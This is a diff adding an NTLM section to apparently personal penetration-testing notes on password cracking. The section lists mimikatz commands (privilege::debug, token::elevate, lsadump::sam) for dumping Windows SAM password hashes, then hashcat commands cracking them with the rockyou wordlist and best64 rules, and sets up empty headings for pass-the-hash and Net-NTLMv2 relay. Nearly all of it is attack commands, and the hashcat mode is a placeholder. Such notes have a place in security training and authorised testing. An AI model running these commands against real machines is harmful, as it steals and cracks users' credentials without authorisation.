@@ -49,4 +49,30 @@ vim /etc/john/john.config
 john --wordlist=ssh.passwords --rules=sshJohnRules ssh.hash
 ```
 
+## NTLM
 
+On Windows:
+```
+Get-LocalUser
+.\mimikatz.exe
+privilege::debug
+token::elevate
+lsadump::sam
+```
+Back on Kali:
+```
+hashcat -h | grep -i ntlm
+hashcat -m ntlm.mode user.hash /u/s/w/rockyou.txt -r /u/s/h/r/best64.rule --force
+```
+
+## Pass NTLM
+
+
+## Net-NTLMv2
+
+
+## Relay Net-NTLMv2
+
+
+
+```
